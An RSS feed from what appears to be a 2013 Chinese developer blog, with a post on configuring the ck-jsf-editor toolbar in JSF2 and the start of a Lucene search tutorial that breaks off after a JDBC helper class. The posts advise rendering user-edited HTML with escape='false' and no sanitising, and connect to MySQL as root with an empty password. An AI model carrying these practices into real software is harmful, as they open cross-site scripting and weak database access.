        		<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
    <title>七孑bit的个人页面</title> 
    <link>http://my.oschina.net/chen7</link> 
    <description>七孑bit的博客</description>
    <language>zh-CN</language>
    <pubDate>Mon, 09 Sep 2013 10:47:25 +0800</pubDate>    
	<image>
		<link>http://my.oschina.net/chen7</link>
		<url>http://static.oschina.net/uploads/user/$__user.SmallPortrait()</url>
		<title>七孑bit</title>
	</image>
		<item>
        <title>在JSF2中使用编辑器ck-jsf-editor</title>
        <link>http://my.oschina.net/chen7/blog/160055</link>
        <category>JSF</category>
        <description><![CDATA[<p>项目中需求要添加文章。第一个关键点是要选择一款好用的在线编辑器。谷歌了下，在JSF中还真有一款，ck-jsf-editor。</p>  <p>ck-jsf-editor不多介绍了，继承自ckeditor。下面讲讲用法：</p>  <p>先下载jar包，地址谷歌下，我用的是ck-jsf-editor-0.9.4.jar。将jar包添加到项目中后，直接就可以用了。添加域：<a title=" xmlns:ck=&quot;http://code.google.com/ck-jsf-editor&quot;" href=" xmlns:ck=&quot;http://code.google.com/ck-jsf-editor&quot;"> xmlns:ck=&quot;http://code.google.com/ck-jsf-editor&quot;</a>，代码是：</p>  <p> &lt;ck:editor value=&quot;#{xxx.xxx}&quot; uiColor=&quot;aed0ea&quot;/&gt;。但是有个问题，显示的toolbar太多了，很多用不到，很占地方，还好这个编辑器是可以定制的。toolbar属性可选为full或者basic，如果两者都不满足，去修改jar包的配置文件config.js。</p>  <p>将jar包解压，找到config.js。我最后修改为：</p>  <div id="scid:9D7513F9-C04C-4721-824A-2B34F0212519:a45161c4-55b8-468a-afa0-da2f42e323a7" class="wlWriterEditableSmartContent" style="float: none; padding-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; display: inline; padding-right: 0px"><pre style=" width: 800px; height: 575px;background-color:White;overflow: auto;"><div><!--

Code highlighting produced by Actipro CodeHighlighter (freeware)
http://www.CodeHighlighter.com/

--><span style="color: #000000;">
CKEDITOR.editorConfig </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">function</span><span style="color: #000000;">( config )
 { config.toolbar </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #000000;">'</span><span style="color: #000000;">Full</span><span style="color: #000000;">'</span><span style="color: #000000;">;   
 config.toolbar_Full </span><span style="color: #000000;">=</span><span style="color: #000000;"> [
 { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">clipboard</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Cut</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Copy</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Paste</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">PasteText</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">PasteFromWord</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Undo</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Redo</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, 
 { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">editing</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Find</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Replace</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">SelectAll</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">SpellChecker</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Scayt</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, 
  </span><span style="color: #000000;">'</span><span style="color: #000000;">/</span><span style="color: #000000;">'</span><span style="color: #000000;">, 
 { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">basicstyles</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Bold</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Italic</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Underline</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Strike</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Subscript</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Superscript</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">RemoveFormat</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, 
 { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">paragraph</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">NumberedList</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">BulletedList</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Outdent</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Indent</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Blockquote</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">CreateDiv</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">JustifyLeft</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">JustifyCenter</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">JustifyRight</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">JustifyBlock</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">BidiLtr</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">BidiRtl</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, 
 { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">links</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Link</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Unlink</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Anchor</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, 
 { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">insert</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Image</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Flash</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Table</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">HorizontalRule</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Smiley</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">SpecialChar</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">PageBreak</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Iframe</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, </span><span style="color: #000000;">'</span><span style="color: #000000;">/</span><span style="color: #000000;">'</span><span style="color: #000000;">, 
 { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">styles</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Styles</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Format</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Font</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">FontSize</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, 
 { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">colors</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">TextColor</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">BGColor</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, 
 ]; 
 config.toolbar_Basic </span><span style="color: #000000;">=</span><span style="color: #000000;"> [ [</span><span style="color: #000000;">'</span><span style="color: #000000;">Bold</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Italic</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">NumberedList</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">BulletedList</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Link</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Unlink</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">About</span><span style="color: #000000;">'</span><span style="color: #000000;">] ];};</span></div></pre><!-- Code inserted with Steve Dunn's Windows Live Writer Code Formatter Plugin.  http://dunnhq.com --></div>



<p>读者可以根据自己的需求修改，full应该是：</p>

<p>
  <div id="scid:9D7513F9-C04C-4721-824A-2B34F0212519:1e289caa-e8e7-4bd4-89b6-67288df1ae84" class="wlWriterEditableSmartContent" style="float: none; padding-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; display: inline; padding-right: 0px"><pre style=" width: 800px; height: 575px;background-color:White;overflow: auto;"><div><!--

Code highlighting produced by Actipro CodeHighlighter (freeware)
http://www.CodeHighlighter.com/

--><span style="color: #000000;">config.toolbar </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #000000;">'</span><span style="color: #000000;">Full</span><span style="color: #000000;">'</span><span style="color: #000000;">;  
config.toolbar_Full </span><span style="color: #000000;">=</span><span style="color: #000000;"> [ { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">document</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Source</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Save</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">NewPage</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">DocProps</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Preview</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Print</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Templates</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] },
{ name: </span><span style="color: #000000;">'</span><span style="color: #000000;">clipboard</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Cut</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Copy</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Paste</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">PasteText</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">PasteFromWord</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Undo</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Redo</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">editing</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Find</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Replace</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">SelectAll</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">SpellChecker</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Scayt</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">forms</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Form</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Checkbox</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Radio</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">TextField</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Textarea</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Select</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Button</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">ImageButton</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">HiddenField</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, </span><span style="color: #000000;">'</span><span style="color: #000000;">/</span><span style="color: #000000;">'</span><span style="color: #000000;">, 
{ name: </span><span style="color: #000000;">'</span><span style="color: #000000;">basicstyles</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Bold</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Italic</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Underline</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Strike</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Subscript</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Superscript</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">RemoveFormat</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, 
{ name: </span><span style="color: #000000;">'</span><span style="color: #000000;">paragraph</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">NumberedList</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">BulletedList</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Outdent</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Indent</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Blockquote</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">CreateDiv</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">JustifyLeft</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">JustifyCenter</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">JustifyRight</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">JustifyBlock</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">BidiLtr</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">BidiRtl</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] },
{ name: </span><span style="color: #000000;">'</span><span style="color: #000000;">links</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Link</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Unlink</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Anchor</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">insert</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Image</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Flash</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Table</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">HorizontalRule</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Smiley</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">SpecialChar</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">PageBreak</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Iframe</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, </span><span style="color: #000000;">'</span><span style="color: #000000;">/</span><span style="color: #000000;">'</span><span style="color: #000000;">, 
{ name: </span><span style="color: #000000;">'</span><span style="color: #000000;">styles</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Styles</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Format</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">Font</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">FontSize</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, { name: </span><span style="color: #000000;">'</span><span style="color: #000000;">colors</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">TextColor</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">BGColor</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] }, 
{ name: </span><span style="color: #000000;">'</span><span style="color: #000000;">tools</span><span style="color: #000000;">'</span><span style="color: #000000;">, items : [ </span><span style="color: #000000;">'</span><span style="color: #000000;">Maximize</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">ShowBlocks</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">About</span><span style="color: #000000;">'</span><span style="color: #000000;"> ] } ];   
config.toolbar_Basic </span><span style="color: #000000;">=</span><span style="color: #000000;"> [ [</span><span style="color: #000000;">'</span><span style="color: #000000;">Bold</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Italic</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">NumberedList</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">BulletedList</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Link</span><span style="color: #000000;">'</span><span style="color: #000000;">, </span><span style="color: #000000;">'</span><span style="color: #000000;">Unlink</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">-</span><span style="color: #000000;">'</span><span style="color: #000000;">,</span><span style="color: #000000;">'</span><span style="color: #000000;">About</span><span style="color: #000000;">'</span><span style="color: #000000;">] ];</span></div></pre><!-- Code inserted with Steve Dunn's Windows Live Writer Code Formatter Plugin.  http://dunnhq.com --></div>
</p>

<p>还有一点需要注意的是，我使用&lt;h:outputText&gt;无法识别html标签，查了下，只要将属性escape=&quot;false&quot;即可。</p>

<p>本文参考：<a href="http://blog.sina.com.cn/s/blog_568e662301012cpa.html">http://blog.sina.com.cn/s/blog_568e662301012cpa.html</a>&#160;</p>

<p>希望可以帮到需要的同学</p>]]></description>
        <pubDate>Mon, 09 Sep 2013 10:47:25 +0800</pubDate>
        <guid>http://my.oschina.net/chen7/blog/160055</guid>
    </item>
			<item>
        <title>在J2EE项目中使用lucene搜索引擎</title>
        <link>http://my.oschina.net/chen7/blog/159419</link>
        <category>JSF</category>
        <description><![CDATA[<p>lucene是应用最广泛的java搜索引擎，具体介绍在这里就不讲了。下面主要讲下如何在电商项目中使用lucene作为搜索引擎搜索商品。 </p>  <p>我使用的版本是4.4，网上的教程大多是3.x的，所以我参考了： </p>  <p><a href="http://blog.csdn.net/name_110/article/details/6963066" rel="nofollow">http://blog.csdn.net/name_110/article/details/6963066</a> </p>  <p><a href="http://davenzhang.com/lucene_tutorial.htm" rel="nofollow">http://davenzhang.com/lucene_tutorial.htm</a>这两篇文章，写了这个4.4访问数据库的版本 </p>  <p>首先创建一个jdbc的链接 </p>  <p>&#160;&#160; <div id="scid:9D7513F9-C04C-4721-824A-2B34F0212519:6a7c90c5-c735-4ef2-b9b8-d57b54b05e20" class="wlWriterEditableSmartContent" style="float: none; padding-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; display: inline; padding-right: 0px"><pre style=" width: 800px; height: 575px;background-color:White;overflow: auto;"><div><!--

Code highlighting produced by Actipro CodeHighlighter (freeware)
http://www.CodeHighlighter.com/

--><span style="color: #0000FF;">import</span><span style="color: #000000;"> java.sql.Connection;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> java.sql.DriverManager;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> java.sql.SQLException;

</span><span style="color: #0000FF;">public</span><span style="color: #000000;"> </span><span style="color: #0000FF;">class</span><span style="color: #000000;"> JdbcUtil {     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> Connection conn </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> </span><span style="color: #0000FF;">final</span><span style="color: #000000;"> String URL </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #000000;">&quot;</span><span style="color: #000000;">jdbc:mysql://127.0.0.1/ecshop?autoReconnect=true&amp;characterEncoding=utf8</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">;     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> </span><span style="color: #0000FF;">final</span><span style="color: #000000;"> String JDBC_DRIVER </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #000000;">&quot;</span><span style="color: #000000;">com.mysql.jdbc.Driver</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">;     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> </span><span style="color: #0000FF;">final</span><span style="color: #000000;"> String USER_NAME </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #000000;">&quot;</span><span style="color: #000000;">root</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">;     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> </span><span style="color: #0000FF;">final</span><span style="color: #000000;"> String PASSWORD </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #000000;">&quot;&quot;</span><span style="color: #000000;">;  
      
    </span><span style="color: #0000FF;">public</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> Connection getConnection() {     
        </span><span style="color: #0000FF;">try</span><span style="color: #000000;"> {     
            Class.forName(JDBC_DRIVER);     
            conn </span><span style="color: #000000;">=</span><span style="color: #000000;"> DriverManager.getConnection(URL, USER_NAME, PASSWORD);     
        } </span><span style="color: #0000FF;">catch</span><span style="color: #000000;"> (ClassNotFoundException e) {     
            e.printStackTrace();     
        } </span><span style="color: #0000FF;">catch</span><span style="color: #000000;"> (SQLException e) {     
            e.printStackTrace();     
        }     
        </span><span style="color: #0000FF;">return</span><span style="color: #000000;"> conn;     
    }  
}    </span></div></pre><!-- Code inserted with Steve Dunn's Windows Live Writer Code Formatter Plugin.  http://dunnhq.com --></div>&#160;&#160;&#160; <br />&#160;&#160; <br />&#160; <br /></p>

<p>&#160;</p>
<b></b>

<p>之后建立一个搜索类 </p>

<p>&#160; </p>

<div>
  <pre>
